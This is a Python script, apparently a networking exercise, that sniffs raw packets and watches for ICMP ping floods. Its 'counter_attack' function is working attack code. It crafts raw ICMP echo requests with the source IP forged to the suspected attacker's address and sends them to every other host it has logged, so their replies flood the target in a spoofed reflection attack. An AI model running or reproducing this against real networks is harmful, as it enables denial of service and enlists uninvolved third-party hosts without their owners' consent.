import datetime
import socket
import struct
import sys

ETH_P_ALL = 0x0003
protocodes = {1: "ICMP", 17: "UDP", 6: "TCP"}


def checksum(msg):
    s = 0
    # add padding if not multiple of 2 (16 bits)
    msg = (msg + b'\x00') if len(msg) % 2 else msg
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i + 1] << 8)
        s = s + w
        s = (s & 0xffff) + (s >> 16)
    s = ~s & 0xffff
    return socket.ntohs(s)


def bytes_to_mac(bytesmac):
    return ":".join("{:02x}".format(x) for x in bytesmac)


try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
except OSError as msg:
    print('Error' + str(msg))
    sys.exit(1)

print('Socket created!')

s.bind(('eth0', 0))
ipList = {}


def counter_attack(attacker_ip):
    print("Attacked by " + attacker_ip)
    for ip in ipList:
        if ip != attacker_ip:
            print("Counter attack started with friend IP: " + ip)
            ###################
            # Include IP header
            sender_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname(
                "icmp"))  # This option controls whether datagrams may be broadcast from the socket. The value has type int; a nonzero value means “yes”.
            sender_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

            ##########################
            # ICMP Echo Request Header
            type = 8
            code = 0
            mychecksum = 0
            identifier = 12345
            seqnumber = 0
            payload = b"istoehumteste"

            # Pack ICMP header fields
            icmp_packet = struct.pack("!BBHHH%ds" % len(payload), type, code, mychecksum, identifier, seqnumber,
                                      payload)

            # Calculate checksum
            mychecksum = checksum(icmp_packet)
            # print("Checksum: {:02x}".format(mychecksum))

            # Repack with checksum
            icmp_packet = struct.pack("!BBHHH%ds" % len(payload), type, code, mychecksum, identifier, seqnumber,
                                      payload)

            # Header IP
            ip_ver = 4
            ip_ihl = 5
            ip_tos = 0
            ip_tot_len = 0  # automaticamente preenchido - AF_INET
            ip_id = 54321
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_ICMP
            ip_check = 0  # automaticamente preenchido - AF_INET
            print("Attacker: " + attacker_ip)
            ip_saddr = socket.inet_aton(attacker_ip)
            ip_daddr = socket.inet_aton(ip)

            ip_ihl_ver = (ip_ver << 4) + ip_ihl

            # Pack IP header fields
            ip_header = struct.pack("!BBHHHBBH4s4s", ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl,
                                    ip_proto, ip_check, ip_saddr, ip_daddr)

            ########################

            # Destination IP address
            dest_ip = ip
            dest_addr = socket.gethostbyname(dest_ip)

            # Send icmp_packet to address = (host, port)
            sender_socket.sendto(ip_header + icmp_packet, (dest_addr, 0))


while True:
    (packet, addr) = s.recvfrom(65536)

    eth_length = 14
    eth_header = packet[:14]

    eth = struct.unpack("!6s6sH", eth_header)

    # print("MAC Dst: "+bytes_to_mac(eth[0]))
    # print("MAC Src: "+bytes_to_mac(eth[1]))
    # print("Type: "+hex(eth[2]))

    if eth[2] == 0x0800:  # protocolo IP
        # print("IP Packet")
        ip_header = packet[eth_length:20 + eth_length]
        iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl * 4
        ttl = iph[5]
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8])
        d_addr = socket.inet_ntoa(iph[9])
        if protocol == socket.IPPROTO_ICMP:
            icmp_header = packet[eth_length + iph_length:]
            icmph = struct.unpack("!BBHHH%ds" % (len(icmp_header) - 8), icmp_header)
            type = icmph[0]
            code = icmph[1]
            mychecksum = icmph[2]
            identifier = icmph[3]
            seqnumber = icmph[4]
            payload = icmph[5]
            if type == 8 and code == 0:
                print("Recebi ping request de {0} - {1} ".format(bytes_to_mac(eth[1]), s_addr))
                print("ICMP Echo Request")
                if s_addr not in ipList or datetime.datetime.now() > ipList[s_addr][1] + datetime.timedelta(seconds=5):
                    ipList[s_addr] = [0, datetime.datetime.now()]
                else:
                    ipList[s_addr] = [ipList[s_addr][0] + 1, datetime.datetime.now()]
                if ipList[s_addr][0] > 5:
                    counter_attack(s_addr)
                print("IP List: " + str(ipList) + "\n")